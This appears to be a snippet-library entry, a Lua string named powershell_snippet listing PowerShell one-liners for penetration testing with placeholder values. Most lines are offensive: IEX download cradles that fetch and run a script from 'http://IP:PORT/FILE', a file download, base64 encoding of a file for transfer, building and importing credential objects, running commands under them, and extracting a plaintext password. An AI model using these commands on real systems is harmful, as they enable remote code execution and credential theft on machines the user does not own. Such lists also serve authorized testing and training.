powershell_snippet = [[
Get-Command COMMAND
Get-ChildItem -Path PATH -Filte FILE -Recurse
IEX(New-Object Net.WebClient).DownloadString('http://IP:PORT/FILE')
IEX (IWR 'http://IP:PORT/FILE' -UseBasicParsing)
(New-Object Net.WebClient).DownloadFile('http://IP:PORT/FILE', 'FILE')
[Convert]::ToBase64String([System.IO.File]::ReadAllBytes('PATH'))
$pass = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\USERNAME', $pass)
$cred = Import-CliXml -Path PATH
Invoke-Command -ScriptBlock {whoami} -Credential $cred -Computer localhost
$cred.GetNetworkCredential().Password
]]
